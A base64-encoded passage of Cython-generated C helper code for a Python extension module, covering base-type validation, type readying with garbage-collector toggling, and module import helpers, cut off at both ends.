JldHVybiByZXN1bHQ7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSghbWV0aG9kKSkgZ290byBiYWQ7XG4gICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKG1ldGhvZCk7XG4gICAgUHlfREVDUkVGKG1ldGhvZCk7XG5iYWQ6XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbmRpZlxufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbnN0YXRpYyBpbnQgX19QeXhfdmFsaWRhdGVfYmFzZXNfdHVwbGUoY29uc3QgY2hhciAqdHlwZV9uYW1lLCBQeV9zc2l6ZV90IGRpY3RvZmZzZXQsIFB5T2JqZWN0ICpiYXNlcykge1xuICAgIFB5X3NzaXplX3QgaSwgbjtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKGJhc2VzKTtcbiNlbHNlXG4gICAgbiA9IFB5VHVwbGVfU2l6ZShiYXNlcyk7XG4gICAgaWYgKHVubGlrZWx5KG4gPCAwKSkgcmV0dXJuIC0xO1xuI2VuZGlmXG4gICAgZm9yIChpID0gMTsgaSA8IG47IGkrKylcbiAgICB7XG4gICAgICAgIFB5VHlwZU9iamVjdCAqYjtcbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBQeU9iamVjdCAqYjAgPSBQeVNlcXVlbmNlX0dldEl0ZW0oYmFzZXMsIGkpO1xuICAgICAgICBpZiAoIWIwKSByZXR1cm4gLTE7XG4jZWxpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIFB5T2JqZWN0ICpiMCA9IFB5VHVwbGVfR0VUX0lURU0oYmFzZXMsIGkpO1xuI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKmIwID0gUHlUdXBsZV9HZXRJdGVtKGJhc2VzLCBpKTtcbiAgICAgICAgaWYgKCFiMCkgcmV0dXJuIC0xO1xuI2VuZGlmXG4gICAgICAgIGIgPSAoUHlUeXBlT2JqZWN0KikgYjA7XG4gICAgICAgIGlmICghX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoYiwgUHlfVFBGTEFHU19IRUFQVFlQRSkpXG4gICAgICAgIHtcbiAgICAgICAgICAgIF9fUHl4X1R5cGVOYW1lIGJfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoYik7XG4gICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICJiYXNlIGNsYXNzIFwnIiBfX1B5eF9GTVRfVFlQRU5BTUUgIlwnIGlzIG5vdCBhIGhlYXAgdHlwZSIsIGJfbmFtZSk7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoYl9uYW1lKTtcbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgUHlfREVDUkVGKGIwKTtcbiNlbmRpZlxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICB9XG4gICAgICAgIGlmIChkaWN0b2Zmc2V0ID09IDApXG4gICAgICAgIHtcbiAgICAgICAgICAgIFB5X3NzaXplX3QgYl9kaWN0b2Zmc2V0ID0gMDtcbiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAgICAgICAgIGJfZGljdG9mZnNldCA9IGItPnRwX2RpY3RvZmZzZXQ7XG4jZWxzZVxuICAgICAgICAgICAgUHlPYmplY3QgKnB5X2JfZGljdG9mZnNldCA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoKFB5T2JqZWN0KiliLCAiX19kaWN0b2Zmc2V0X18iKTtcbiAgICAgICAgICAgIGlmICghcHlfYl9kaWN0b2Zmc2V0KSBnb3RvIGRpY3RvZmZzZXRfcmV0dXJuO1xuICAgICAgICAgICAgYl9kaWN0b2Zmc2V0ID0gUHlMb25nX0FzU3NpemVfdChweV9iX2RpY3RvZmZzZXQpO1xuICAgICAgICAgICAgUHlfREVDUkVGKHB5X2JfZGljdG9mZnNldCk7XG4gICAgICAgICAgICBpZiAoYl9kaWN0b2Zmc2V0ID09IC0xICYmIFB5RXJyX09jY3VycmVkKCkpIGdvdG8gZGljdG9mZnNldF9yZXR1cm47XG4jZW5kaWZcbiAgICAgICAgICAgIGlmIChiX2RpY3RvZmZzZXQpIHtcbiAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X1R5cGVOYW1lIGJfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoYik7XG4gICAgICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiZXh0ZW5zaW9uIHR5cGUgXCclLjIwMHNcJyBoYXMgbm8gX19kaWN0X18gc2xvdCwgIlxuICAgICAgICAgICAgICAgICAgICAgICAgImJ1dCBiYXNlIHR5cGUgXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgaGFzOiAiXG4gICAgICAgICAgICAgICAgICAgICAgICAiZWl0aGVyIGFkZCBcJ2NkZWYgZGljdCBfX2RpY3RfX1wnIHRvIHRoZSBleHRlbnNpb24gdHlwZSAiXG4gICAgICAgICAgICAgICAgICAgICAgICAib3IgYWRkIFwnX19zbG90c19fID0gWy4uLl1cJyB0byB0aGUgYmFzZSB0eXBlIixcbiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGVfbmFtZSwgYl9uYW1lKTtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKGJfbmFtZSk7XG4gICAgICAgICAgICAgICAgfVxuI2lmICFDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAgICAgICAgICAgZGljdG9mZnNldF9yZXR1cm46XG4jZW5kaWZcbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihiMCk7XG4jZW5kaWZcbiAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBQeV9ERUNSRUYoYjApO1xuI2VuZGlmXG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuI2VuZGlmXG5cblxuQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9IYXNNdWx0aXBsZUluaGVyaXRhbmNlKFB5VHlwZU9iamVjdCAqdCkge1xuICAgIHdoaWxlICh0KSB7XG4gICAgICAgIFB5T2JqZWN0ICpiYXNlcyA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2VzLCBQeU9iamVjdCopO1xuICAgICAgICBpZiAoYmFzZXMpIHtcbiAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICB9XG4gICAgICAgIHQgPSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0LCB0cF9iYXNlLCBQeVR5cGVPYmplY3QqKTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9SZWFkeShQeVR5cGVPYmplY3QgKnQpIHtcbiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgfHwgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKFBZU1RPTl9NQUpPUl9WRVJTSU9OKVxuICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwO1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAgICh2b2lkKV9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlO1xuI2VuZGlmXG4gICAgcmV0dXJuIFB5VHlwZV9SZWFkeSh0KTtcbiNlbHNlXG4gICAgaW50IHI7XG4gICAgaWYgKCFfX1B5eF9QeVR5cGVfSGFzTXVsdGlwbGVJbmhlcml0YW5jZSh0KSkge1xuICAgICAgICByZXR1cm4gUHlUeXBlX1JlYWR5KHQpO1xuICAgIH1cbiAgICBQeU9iamVjdCAqYmFzZXMgPSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0LCB0cF9iYXNlcywgUHlPYmplY3QqKTtcbiAgICBpZiAoYmFzZXMgJiYgdW5saWtlbHkoX19QeXhfdmFsaWRhdGVfYmFzZXNfdHVwbGUodC0+dHBfbmFtZSwgdC0+dHBfZGljdG9mZnNldCwgYmFzZXMpID09IC0xKSlcbiAgICAgICAgcmV0dXJuIC0xO1xuI2lmICFkZWZpbmVkKFBZU1RPTl9NQUpPUl9WRVJTSU9OKVxuICAgIHtcbiAgICAgICAgaW50IGdjX3dhc19lbmFibGVkO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMGIxXG4gICAgICAgIGdjX3dhc19lbmFibGVkID0gUHlHQ19EaXNhYmxlKCk7XG4gICAgICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwO1xuICAgICNlbHNlXG4gICAgICAgIFB5T2JqZWN0ICpyZXQsICpweV9zdGF0dXM7XG4gICAgICAgIFB5T2JqZWN0ICpnYyA9IE5VTEw7XG4gICAgICAgICNpZiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNKzAgPj0gMHgwNzAzMDQwMCkgJiZcXFxuICAgICAgICAgICAgICAgICFDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgICAgIGdjID0gUHlJbXBvcnRfR2V0TW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ2MpO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgaWYgKHVubGlrZWx5KCFnYykpIGdjID0gUHlJbXBvcnRfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ2MpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWdjKSkgcmV0dXJuIC0xO1xuICAgICAgICBweV9zdGF0dXMgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChnYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9pc2VuYWJsZWQpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXB5X3N0YXR1cykpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihnYyk7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgZ2Nfd2FzX2VuYWJsZWQgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUocHlfc3RhdHVzKTtcbiAgICAgICAgUHlfREVDUkVGKHB5X3N0YXR1cyk7XG4gICAgICAgIGlmIChnY193YXNfZW5hYmxlZCA+IDApIHtcbiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKGdjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2Rpc2FibGUpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFyZXQpKSB7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGdjKTtcbiAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBQeV9ERUNSRUYocmV0KTtcbiAgICAgICAgfSBlbHNlIGlmICh1bmxpa2VseShnY193YXNfZW5hYmxlZCA9PSAtMSkpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihnYyk7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAjZW5kaWZcbiAgICAgICAgdC0+dHBfZmxhZ3MgfD0gUHlfVFBGTEFHU19IRUFQVFlQRTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwXG4gICAgICAgIHQtPnRwX2ZsYWdzIHw9IFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRTtcbiNlbmRpZlxuI2Vsc2VcbiAgICAgICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7XG4jZW5kaWZcbiAgICByID0gUHlUeXBlX1JlYWR5KHQpO1xuI2lmICFkZWZpbmVkKFBZU1RPTl9NQUpPUl9WRVJTSU9OKVxuICAgICAgICB0LT50cF9mbGFncyAmPSB+UHlfVFBGTEFHU19IRUFQVFlQRTtcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBiMVxuICAgICAgICBpZiAoZ2Nfd2FzX2VuYWJsZWQpXG4gICAgICAgICAgICBQeUdDX0VuYWJsZSgpO1xuICAgICNlbHNlXG4gICAgICAgIGlmIChnY193YXNfZW5hYmxlZCkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnRwLCAqdiwgKnRiO1xuICAgICAgICAgICAgUHlFcnJfRmV0Y2goJnRwLCAmdiwgJnRiKTtcbiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKGdjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2VuYWJsZSk7XG4gICAgICAgICAgICBpZiAobGlrZWx5KHJldCB8fCByID09IC0xKSkge1xuICAgICAgICAgICAgICAgIFB5X1hERUNSRUYocmV0KTtcbiAgICAgICAgICAgICAgICBQeUVycl9SZXN0b3JlKHRwLCB2LCB0Yik7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodHApO1xuICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodik7XG4gICAgICAgICAgICAgICAgUHlfWERFQ1JFRih0Yik7XG4gICAgICAgICAgICAgICAgciA9IC0xO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIFB5X0RFQ1JFRihnYyk7XG4gICAgI2VuZGlmXG4gICAgfVxuI2VuZGlmXG4gICAgcmV0dXJuIHI7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydChQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmZyb21fbGlzdCwgaW50IGxldmVsKSB7XG4gICAgUHlPYmplY3QgKm1vZHVsZSA9IDA7XG4gICAgUHlPYmplY3QgKmVtcHR5X2RpY3QgPSAwO1xuICAgIFB5T2JqZWN0ICplbXB0eV9saXN0ID0gMDtcbiAgICBlbXB0eV9kaWN0ID0gUHlEaWN0X05ldygpO1xuICAgIGlmICh1bmxpa2VseSghZW1wdHlfZGljdCkpXG4gICAgICAgIGdvdG8gYmFkO1xuICAgIGlmIChsZXZlbCA9PSAtMSkge1xuICAgICAgICBjb25zdCBjaGFyKiBwYWNrYWdlX3NlcCA9IHN0cmNocihfX1B5eF9NT0RVTEVfTkFNRSwgXCcuXCcpO1xuICAgICAgICBpZiAocGFja2FnZV9zZXAgIT0gKDApKSB7XG4gICAgICAgICAgICBtb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGVMZXZlbE9iamVjdChcbiAgICAgICAgICAgICAgICBuYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBlbXB0eV9kaWN0LCBmcm9tX2xpc3QsIDEpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSB7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0ltcG9ydEVycm9yKSkpXG4gICAgICAgICAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgbGV2ZWwgPSAwO1xuICAgIH1cbiAgICBpZiAoIW1vZHVsZSkge1xuICAgICAgICBtb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGVMZXZlbE9iamVjdChcbiAgICAgICAgICAgIG5hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIGVtcHR5X2RpY3QsIGZyb21fbGlzdCwgbGV2ZWwpO1xuICAgIH1cbmJhZDpcbiAgICBQeV9YREVDUkVGKGVtcHR5X2RpY3QpO1xuICAgIFB5X1hERUNSRUYoZW1wdHlfbGlzdCk7XG4gICAgcmV0dXJuIG1vZHVsZTtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfRXJyb3IoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSwgUHlfc3NpemVfdCBjb3VudCkge1xuICAgIFB5T2JqZWN0ICpwYXJ0aWFsX25hbWUgPSBOVUxMLCAqc2xpY2UgPSBOVUxMLCAqc2VwID0gTlVMTDtcbiAgICBQeV9zc2l6ZV90IHNpemU7XG4gICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgfVxuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgc2l6ZSA9IFB5VHVwbGVfR0VUX1NJWkUocGFydHNfdHVwbGUpO1xuI2Vsc2VcbiAgICBzaXplID0gUHlUdXBsZV9TaXplKHBhcnRzX3R1cGxlKTtcbiAgICBpZiAoc2l6ZSA8IDApIGdvdG8gYmFkO1xuI2VuZGlmXG4gICAgaWYgKGxpa2VseShzaXplID09IGNvdW50KSkge1xuICAgICAgICBwYXJ0aWFsX25hbWUgPSBuYW1lO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHNsaWNlID0gUHlTZXF1ZW5jZV9HZXRTbGljZShwYXJ0c190dXBsZSwgMCwgY291bnQpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXNsaWNlKSlcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICBzZXAgPSBQeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoIi4iLCAxKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFzZXApKVxuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgIHBhcnRpYWxfbmFtZSA9IFB5VW5pY29kZV9Kb2luKHNlcCwgc2xpY2UpO1xuICAgIH1cbiAgICBQeUVycl9Gb3JtYXQoXG4gICAgICAgIFB5RXhjX01vZHVsZU5vdEZvdW5kRXJyb3IsXG4gICAgICAgICJObyBtb2R1bGUgbmFtZWQgXCclVVwnIiwgcGFydGlhbF9uYW1lKTtcbmJhZDpcbiAgICBQeV9YREVDUkVGKHNlcCk7XG4gICAgUHlfWERFQ1JFRihzbGljZSk7XG4gICAgUHlfWERFQ1JFRihwYXJ0aWFsX25hbWUpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlX0xvb2t1cChQeU9iamVjdCAqbmFtZSkge1xuICAgIFB5T2JqZWN0ICppbXBvcnRlZF9tb2R1bGU7XG4jaWYgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWVBZX1ZFUlNJT05fTlVNICA8IDB4MDcwMzA0MDApIHx8XFxcbiAgICAgICAgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTFxuICAgIFB5T2JqZWN0ICptb2R1bGVzID0gUHlJbXBvcnRfR2V0TW9kdWxlRGljdCgpO1xuICAgIGlmICh1bmxpa2VseSghbW9kdWxlcykpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIGltcG9ydGVkX21vZHVsZSA9IF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyKG1vZHVsZXMsIG5hbWUpO1xuICAgIFB5X1hJTkNSRUYoaW1wb3J0ZWRfbW9kdWxlKTtcbiNlbHNlXG4gICAgaW1wb3J0ZWRfbW9kdWxlID0gUHlJbXBvcnRfR2V0TW9kdWxlKG5hbWUpO1xuI2VuZGlmXG4gICAgcmV0dXJuIGltcG9ydGVkX21vZHVsZTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlX1dhbGtQYXJ0cyhQeU9iamVjdCAqbW9kdWxlLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlKSB7XG4gICAgUHlfc3NpemVfdCBpLCBucGFydHM7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICBucGFydHMgPSBQeVR1cGxlX0dFVF9TSVpFKHBhcnRzX3R1cGxlKTtcbiNlbHNlXG4gICAgbnBhcnRzID0gUHlUdXBsZV9TaXplKHBhcnRzX3R1cGxlKTtcbiAgICBpZiAobnBhcnRzIDwgMCkgcmV0dXJuIE5VTEw7XG4jZW5kaWZcbiAgICBmb3IgKGk9MTsgaSA8IG5wYXJ0cyAmJiBtb2R1bGU7IGkrKykge1xuICAgICAgICBQeU9iamVjdCAqcGFydCwgKnN1Ym1vZHVsZTtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBwYXJ0ID0gUHlUdXBsZV9HRVRfSVRFTShwYXJ0c190dXBsZSwgaSk7XG4jZWxzZVxuICAgICAgICBwYXJ0ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHBhcnRzX3R1cGxlLCBpKTtcbiAgICAgICAgaWYgKCFwYXJ0KSByZXR1cm4gTlVMTDtcbiNlbmRpZlxuICAgICAgICBzdWJtb2R1bGUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihtb2R1bGUsIHBhcnQpO1xuI2lmICEoQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMpXG4gICAgICAgIFB5X0RFQ1JFRihwYXJ0KTtcbiNlbmRpZlxuICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTtcbiAgICAgICAgbW9kdWxlID0gc3VibW9kdWxlO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfRXJyb3IobmFtZSwgcGFydHNfdHVwbGUsIGkpO1xuICAgIH1cbiAgICByZXR1cm4gbW9kdWxlO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpIHtcbiAgICBQeU9iamVjdCAqaW1wb3J0ZWRfbW9kdWxlO1xuICAgIFB5T2JqZWN0ICptb2R1bGUgPSBfX1B5eF9JbXBvcnQobmFtZSwgTlVMTCwgMCk7XG4gICAgaWYgKCFwYXJ0c190dXBsZSB8fCB1bmxpa2VseSghbW9kdWxlKSlcbiAgICAgICAgcmV0dXJuIG1vZHVsZTtcbiAgICBpbXBvcnRlZF9tb2R1bGUgPSBfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlX0xvb2t1cChuYW1lKTtcbiAgICBpZiAobGlrZWx5KGltcG9ydGVkX21vZHVsZSkpIHtcbiAgICAgICAgUHlfREVDUkVGKG1vZHVsZSk7XG4gICAgICAgIHJldHVybiBpbXBvcnRlZF9tb2R1bGU7XG4gICAgfVxuICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgcmV0dXJuIF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZV9XYWxrUGFydHMobW9kdWxlLCBuYW1lLCBwYXJ0c190dXBsZSk7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgUHlPYmplY3QgKm1vZHVsZSA9IF9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfTG9va3VwKG5hbWUpO1xuICAgIGlmIChsaWtlbHkobW9kdWxlKSkge1xuICAgICAgICBQeU9iamVjdCAqc3BlYyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKG1vZHVsZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwZWMpO1xuICAgICAgICBpZiAobGlrZWx5KHNwZWMpKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqdW5zYWZlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3Ioc3BlYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luaXRpYWxpemluZyk7XG4gICAgICAgICAgICBpZiAobGlrZWx5KCF1bnNhZmUgfHwgIV9fUHl4X1B5T2JqZWN0X0lzVHJ1ZSh1bnNhZmUpKSkge1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihzcGVjKTtcbiAgICAgICAgICAgICAgICBzcGVjID0gTlVMTDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIFB5X1hERUNSRUYodW5zYWZlKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAobGlrZWx5KCFzcGVjKSkge1xuICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgICAgIHJldHVybiBtb2R1bGU7XG4gICAgICAgIH1cbiAgICAgICAgUHlfREVDUkVGKHNwZWMpO1xuICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTtcbiAgICB9IGVsc2UgaWYgKFB5RXJyX09jY3VycmVkKCkpIHtcbiAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICB9XG4jZW5kaWZcbiAgICByZXR1cm4gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZShuYW1lLCBwYXJ0c190dXBsZSk7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUxpc3RfUGFjayhQeV9zc2l6ZV90IG4sIC4uLikge1xuICAgIHZhX2xpc3QgdmE7XG4gICAgUHlPYmplY3QgKmwgPSBQeUxpc3RfTmV3KG4pO1xuICAgIHZhX3N0YXJ0KHZhLCBuKTtcbiAgICBpZiAodW5saWtlbHkoIWwpKSBnb3RvIGVuZDtcbiAgICBmb3IgKFB5X3NzaXplX3QgaT0wOyBpPG47ICsraSkge1xuICAgICAgICBQeU9iamVjdCAqYXJnID0gdmFfYXJnKHZhLCBQeU9iamVjdCopO1xuICAgICAgICBQeV9JTkNSRUYoYXJnKTtcbiAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShsLCBpLCBhcmcpICE9ICgwKSkge1xuICAgICAgICAgICAgUHlfQ0xFQVIobCk7XG4gICAgICAgICAgICBnb3RvIGVuZDtcbiAgICAgICAgfVxuICAgIH1cbiAgICBlbmQ6XG4gICAgdmFfZW5kKHZhKTtcbiAgICByZXR1cm4gbDtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X0ltcG9ydEZyb20oUHlPYmplY3QqIG1vZHVsZSwgUHlPYmplY3QqIG5hbWUpIHtcbiAgICBQeU9iamVjdCogdmFsdWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG1vZHVsZSwgbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkgJiYgUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19BdHRyaWJ1dGVFcnJvcikpIHtcbiAgICAgICAgY29uc3QgY2hhciogbW9kdWxlX25hbWVfc3RyID0gMDtcbiAgICAgICAgUHlPYmplY3QqIG1vZHVsZV9uYW1lID0gMDtcbiAgICAgICAgUHlPYmplY3QqIG1vZHVsZV9kb3QgPSAwO1xuICAgICAgICBQeU9iamVjdCogZnVsbF9uYW1lID0gMDtcbiAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgbW9kdWxlX25hbWVfc3RyID0gUHlNb2R1bGVfR2V0TmFtZShtb2R1bGUpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZV9uYW1lX3N0cikpIHsgZ290byBtb2RiYWQ7IH1cbiAgICAgICAgbW9kdWxlX25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhtb2R1bGVfbmFtZV9zdHIpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZV9uYW1lKSkgeyBnb3RvIG1vZGJhZDsgfVxuICAgICAgICBtb2R1bGVfZG90ID0gUHlVbmljb2RlX0NvbmNhdChtb2R1bGVfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTMpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZV9kb3QpKSB7IGdvdG8gbW9kYmFkOyB9XG4gICAgICAgIGZ1bGxfbmFtZSA9IFB5VW5pY29kZV9Db25jYXQobW9kdWxlX2RvdCwgbmFtZSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZ